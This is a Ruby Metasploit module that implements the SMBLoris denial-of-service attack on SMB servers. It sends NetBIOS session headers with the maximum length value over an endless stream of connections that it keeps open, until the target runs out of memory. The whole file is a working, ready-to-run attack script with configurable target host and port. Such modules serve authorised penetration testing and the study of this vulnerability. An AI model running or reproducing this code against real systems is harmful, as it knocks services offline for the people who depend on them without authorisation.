#!/usr/bin/env ruby

require 'socket'
require 'metasploit'

require 'bindata'

class NbssHeader < BinData::Record
  endian  :little
  uint8   :message_type
  bit7    :flags
  bit17   :message_length
end

metadata = {
  name: 'SMBLoris NBSS Denial of Service',
  description: %q{
    The SMBLoris attack consumes large chunks of memory in the target by sending
    SMB requests with the NetBios Session Service(NBSS) Length Header value set
    to the maximum possible value. By keeping these connections open and initiating
    large numbers of these sessions, the memory does not get freed, and the server
    grinds to a halt. This vulnerability was originally disclosed by Sean Dillon
    and Zach Harding.

    DISCALIMER: This module opens a lot of simultaneous connections. Please check
    your system's ULIMIT to make sure it can handle it. This module will also run
    continuously until stopped.
  },
  authors: [
      'thelightcosine',
      'Adam Cammack <adam_cammack[at]rapid7.com>'
  ],
  date: '2017-06-29',
  references: [
    { type: 'url', ref: 'http://smbloris.com/' }
  ],
  type: 'dos',
  options: {
    rhost: {type: 'address', description: 'The target address', required: true, default: nil},
    rport: {type: 'port', description: 'SMB port on the target', required: true, default: 445},
  }
}

def run(args)
  header = NbssHeader.new
  header.message_length = 0x01FFFF

  last_reported = 0
  warned = false
  n_loops = 0
  sockets = []

  target = Addrinfo.tcp(args[:rhost], args[:rport].to_i)

  Metasploit.logging_prefix = "#{target.inspect_sockaddr} - "

  while true do
    begin
      sockets.delete_if do |s|
        s.closed?
      end

      nsock = target.connect(timeout: 360)
      nsock.setsockopt(Socket::SOL_SOCKET, Socket::SO_KEEPALIVE, true)
      nsock.setsockopt(Socket::Option.int(:INET, :TCP, :KEEPCNT, 5))
      nsock.setsockopt(Socket::Option.int(:INET, :TCP, :KEEPINTVL, 10))
      nsock.setsockopt(Socket::Option.linger(true, 60))
      nsock.write(header.to_binary_s)
      sockets << nsock

      n_loops += 1
      if  last_reported != sockets.length
        if n_loops % 100 == 0
          last_reported = sockets.length
          Metasploit.log "#{sockets.length} socket(s) open", level: 'info'
        end
      elsif n_loops % 1000 == 0
        Metasploit.log "Holding steady at #{sockets.length} socket(s) open", level: 'info'
      end
    rescue Interrupt
      break
      sockets.each &:close
    rescue Errno::EMFILE
      Metasploit.log "At open socket limit with #{sockets.length} sockets open. Try increasing you system limits.", level: 'warning' unless warned
      warned = true
      sockets.slice(0).close
    rescue Exception => e
      Metasploit.log "Exception sending packet: #{e.message}", level: 'error'
    end
  end
end

if __FILE__ == $PROGRAM_NAME
  Metasploit.run(metadata, method(:run))
end
